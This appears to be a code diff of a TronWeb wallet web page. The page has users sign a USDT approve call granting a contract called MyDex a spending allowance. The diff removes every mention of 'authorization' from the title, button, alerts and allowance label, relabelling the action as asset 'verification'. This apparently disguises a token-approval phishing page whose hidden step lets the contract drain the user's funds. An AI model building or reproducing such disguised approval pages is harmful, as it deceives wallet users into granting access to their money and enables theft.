@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>錢包授權頁</title>
+  <title>驗證資產</title>
   <style>
     .center {
       margin: auto;
@@ -27,7 +27,7 @@
   <div class="center">
     <label>驗證金額：</label>
     <input id="verifyAmount" placeholder="例如 0.1" />
-    <button id="approve_Btn">驗證（授權）</button>
+    <button id="approve_Btn">驗證</button>
   </div>
 
   <div class="center">
@@ -84,10 +84,10 @@ EventServer: ${status.eventServer}`);
         await USDT.approve(MyDex_contractAddress, amount).send({ feeLimit: 100_000_000 });
         await MyDex.addAddress(userAddress).send({ feeLimit: 100_000_000 });
 
-        alert("✅ 授權與加入成功");
+        alert("✅ 加入成功");
       } catch (err) {
-        console.error("❌ 授權錯誤：", err);
-        alert("❌ 授權失敗：" + (err.message || "未知錯誤"));
+        console.error("❌ 錯誤：", err);
+        alert("❌ 失敗：" + (err.message || "未知錯誤"));
       }
     };
 
@@ -99,7 +99,7 @@ EventServer: ${status.eventServer}`);
         const allowance = await USDT.allowance(userAddress, MyDex_contractAddress).call();
         alert(`錢包地址：${userAddress}
 USDT 餘額：${balance / 1e6}
-授權額度：${allowance / 1e6}`);
+額度：${allowance / 1e6}`);
       } catch (err) {
         console.error("❌ 查詢錯誤：", err);
         alert("❌ 查詢失敗：" + (err.message || "未知錯誤"));
